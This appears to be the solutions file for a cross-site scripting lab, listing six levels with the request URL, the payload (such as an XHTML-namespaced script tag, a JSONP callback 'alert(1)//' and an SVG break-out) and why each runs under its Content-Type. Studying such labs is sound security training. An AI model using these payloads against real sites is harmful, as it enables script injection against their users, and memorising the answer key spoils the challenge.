# ctype — solutions

Reflections under unusual Content-Type values (XML/XHTML/CDATA/JSONP/SVG/nosniff).

### ctype-level1

`/ctype/level1/?query=%3Cscript%20xmlns=%22http://www.w3.org/1999/xhtml%22%3Ealert(1)%3C/script%3E`

- payload: `<script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>`
- context: text/xml — XHTML-namespaced script executes when XML is rendered

### ctype-level2

`/ctype/level2/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: application/xhtml+xml — script tag runs as XHTML

### ctype-level3

`/ctype/level3/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: text/html with CDATA — HTML parser ignores CDATA, sees tags directly

### ctype-level4

`/ctype/level4/?callback=alert(1)//`

- payload: `alert(1)//`
- context: JSONP callback name reflected as JS — exploit via attacker <script src=…>

### ctype-level5

`/ctype/level5/?query=%3C/text%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</text><script>alert(1)</script>`
- context: image/svg+xml served directly — SVG executes script tag

### ctype-level6

`/ctype/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: text/html with nosniff — nosniff doesn't block HTML execution
